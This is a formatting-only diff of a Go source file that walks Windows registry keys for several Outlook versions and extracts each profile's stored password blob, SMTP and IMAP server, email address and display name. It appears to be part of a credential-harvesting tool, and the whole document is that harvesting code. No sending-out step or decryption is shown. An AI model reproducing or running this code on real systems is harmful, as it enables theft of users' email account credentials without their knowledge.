@@ -10,15 +10,15 @@ import (
 
 //structure for returning extracted data
 type ExtractedData struct {
-	SMTP string
-	IMAP string
-	Email string
-	Name string
+	SMTP     string
+	IMAP     string
+	Email    string
+	Name     string
 	Password []byte
 }
 
 //function to get a list of registry subfolders
-func getSubkeys(path string) ([]string, int, bool){
+func getSubkeys(path string) ([]string, int, bool) {
 	k, err := registry.OpenKey(registry.CURRENT_USER, path, registry.ENUMERATE_SUB_KEYS)
 	if err != nil {
 		log.Println(err)
@@ -36,7 +36,7 @@ func getSubkeys(path string) ([]string, int, bool){
 }
 
 //function to get a list of registry data from a subfolder
-func enumerateValues(path string) []string{
+func enumerateValues(path string) []string {
 	k, err := registry.OpenKey(registry.CURRENT_USER, path, registry.QUERY_VALUE)
 	if err != nil {
 		log.Println(err)
@@ -48,16 +48,16 @@ func enumerateValues(path string) []string{
 }
 
 //function to extract a binary value from registry data
-func ExtractValues(path string, name string ) (binValues []byte, errors error){
-	g, err := registry.OpenKey(registry.CURRENT_USER, path, registry.QUERY_VALUE | registry.READ)
+func ExtractValues(path string, name string) (binValues []byte, errors error) {
+	g, err := registry.OpenKey(registry.CURRENT_USER, path, registry.QUERY_VALUE|registry.READ)
 	//fmt.Println("PATH --> ", path + `\` + name)
-	if err != nil{
+	if err != nil {
 		fmt.Println(err)
 	}
 	defer g.Close()
 
 	binValues, _, err = g.GetBinaryValue(name)
-	if err != nil{
+	if err != nil {
 		fmt.Println(err)
 	}
 	//fmt.Println("Binary data of ", name, "--> ", binValues)
@@ -72,12 +72,12 @@ func ExtractValues(path string, name string ) (binValues []byte, errors error){
 	*/
 }
 
-func OutlookRun()(Credentials []ExtractedData, err error){
-	baseRegistryPaths := []string {`Software\Microsoft\Office\15.0\Outlook\Profiles\Outlook`,
+func OutlookRun() (Credentials []ExtractedData, err error) {
+	baseRegistryPaths := []string{`Software\Microsoft\Office\15.0\Outlook\Profiles\Outlook`,
 		`Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\Outlook`,
 		`Software\Microsoft\Windows Messaging Subsystem\Profiles`,
 		`Software\Microsoft\Office\16.0\Outlook\Profiles\Outlook`} //Registry paths for different versions of Outlook
-	for _, path := range(baseRegistryPaths){
+	for _, path := range baseRegistryPaths {
 		var AllValues []ExtractedData
 		var err error
 		mainSubkeys, _, status := getSubkeys(path)
@@ -104,43 +104,43 @@ func OutlookRun()(Credentials []ExtractedData, err error){
 
 				for _, name := range subKeyValues {
 					//fmt.Println("\t\t" + name)
-					if strings.Contains(name, "Password"){
-						password, err := ExtractValues(path + `\` + value + `\` + subkey + `\`, name)
-						if err != nil{
+					if strings.Contains(name, "Password") {
+						password, err := ExtractValues(path+`\`+value+`\`+subkey+`\`, name)
+						if err != nil {
 							log.Panic(err)
 						}
 						values.Password = password
 						//fmt.Println(password)
 
 					}
-					if strings.Contains(name, "IMAP Server"){
-						server, err := ExtractValues(path + `\` + value + `\` + subkey + `\`, name)
-						if err != nil{
+					if strings.Contains(name, "IMAP Server") {
+						server, err := ExtractValues(path+`\`+value+`\`+subkey+`\`, name)
+						if err != nil {
 							fmt.Println(err)
 						}
 						values.IMAP = string(server)
 						//fmt.Println(string(server))
 					}
-					if strings.Contains(name, "SMTP Server"){
-						server, err := ExtractValues(path + `\` + value + `\` + subkey + `\`, name)
-						if err != nil{
+					if strings.Contains(name, "SMTP Server") {
+						server, err := ExtractValues(path+`\`+value+`\`+subkey+`\`, name)
+						if err != nil {
 							fmt.Println(err)
 
 						}
 						values.SMTP = string(server)
 						//fmt.Println(string(server))
 					}
-					if strings.Contains(name, "Email"){
-						mail, err := ExtractValues(path + `\` + value + `\` + subkey + `\`, name)
-						if err != nil{
+					if strings.Contains(name, "Email") {
+						mail, err := ExtractValues(path+`\`+value+`\`+subkey+`\`, name)
+						if err != nil {
 							fmt.Println(err)
 						}
 						values.Email = string(mail)
 						//fmt.Println(string(mail))
 					}
-					if strings.Contains(name, "Display Name"){
-						name, err := ExtractValues(path + `\` + value + `\` + subkey + `\`, name)
-						if err != nil{
+					if strings.Contains(name, "Display Name") {
+						name, err := ExtractValues(path+`\`+value+`\`+subkey+`\`, name)
+						if err != nil {
 							fmt.Println(err)
 						}
 						values.Name = string(name)
